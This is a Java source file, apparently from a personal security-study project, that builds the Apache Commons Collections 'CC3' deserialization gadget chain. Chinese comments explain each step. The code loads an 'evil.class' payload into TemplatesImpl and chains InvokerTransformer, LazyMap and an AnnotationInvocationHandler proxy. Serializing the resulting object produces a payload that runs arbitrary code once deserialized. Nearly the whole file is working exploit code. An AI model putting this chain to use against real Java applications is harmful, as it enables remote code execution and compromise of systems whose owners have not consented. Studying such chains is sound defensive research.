package CommonCollections;
import com.sun.org.apache.xalan.internal.utils.ObjectFactory;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


import java.io.*;


import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.AccessController;
import java.security.PrivilegedAction;
import java.util.HashMap;
import java.util.Map;
public class CC3 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        //_name赋值，否则代码return中止
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        //private byte[][] _bytecodes = null;如果为null，报出异常；
        //同时满足这个loader.defineClass(_bytecodes[i]);
        //Class defineClass(final byte[] b) {
        //            return defineClass(null, b, 0, b.length);
        //        }
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        //一维数组满足defineClass参数从而命令执行
        byte[] code = Files.readAllBytes(Paths.get("D:\\java_project\\JavaSecurityStudy\\target\\classes\\CommonCollections\\evil.class"));
        //二维数组满足：
        // private byte[][] _bytecodes = null;如果为null，报出异常；
        //同时满足这个loader.defineClass(_bytecodes[i]);
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);
//    避免_tfactory为空指针而报错
//    TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)
//            AccessController.doPrivileged(new PrivilegedAction() {
//                public Object run() {
//                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
//                }
//            });
        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

//    templates.newTransformer();
        Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
//        chainedTransformer.transform(1);
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> Lazymap = LazyMap.decorate(map,chainedTransformer);


        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationhdlConstructor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Target.class,Lazymap);
//动态代理
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);
        Object o = annotationInvocationhdlConstructor.newInstance(Override.class,mapProxy);

//    serialize(o);
        unserialize("ser.bin");
    }


    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
